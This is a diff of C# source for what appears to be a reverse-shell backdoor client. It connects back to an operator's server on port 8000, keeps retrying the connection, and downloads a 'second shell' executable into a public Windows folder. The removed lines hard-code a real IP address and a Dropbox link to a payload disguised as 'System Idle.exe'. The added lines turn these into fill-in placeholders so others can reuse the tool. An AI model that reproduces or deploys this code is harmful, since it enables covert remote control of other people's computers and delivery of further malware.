@@ -16,7 +16,7 @@ namespace Client
         public static bool socketConnect()
         {
             
-            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("85.65.60.251"), 8000);
+            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("your server local or external IP"), 8000); // Server IP & PORT 
             sck.Connect(endPoint);
             //Console.WriteLine(sck.Connected);
             return sck.Connected;
@@ -41,15 +41,13 @@ namespace Client
             byte[] downloadshell = Encoding.Default.GetBytes("Downloading Second shell on port 9000\n");
             sck.Send(downloadshell, 0, downloadshell.Length, 0);
             WebClient webclient2 = new WebClient();
-            webclient2.DownloadFile(new Uri("https://dl.dropboxusercontent.com/s/zzljkhehbp6trcy/System%20Idle.exe?dl=1&token_hash=AAEttdgdiVnODjMLrsUIFRtHZrBOh_t4IsUluvS7pwl7ng"), @"C:\Users\Public\System Idle.exe");
+            webclient2.DownloadFile(new Uri("www.www.www"), @"C:\Users\Public\SecondSession.exe"); //second client session enter remote address
         }
 
        
         public static bool execcommand()
         {
-            //string shell = "$: ";
-            //byte[] shellbuf = Encoding.Default.GetBytes(shell);
-            //sck.Send(shellbuf, 0, shellbuf.Length, 0);
+
 
             if(i == 0)
             {
@@ -116,11 +114,9 @@ namespace Client
                 }
                 catch (Exception ex)
                 {
-                    //Console.WriteLine(ex);
-                   // Console.WriteLine("Trying Again ...");
-                    System.Threading.Thread.Sleep(5000);
+
+                    System.Threading.Thread.Sleep(5000); // Sleep time before reconnect
                     sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                    
 
                 }
                 
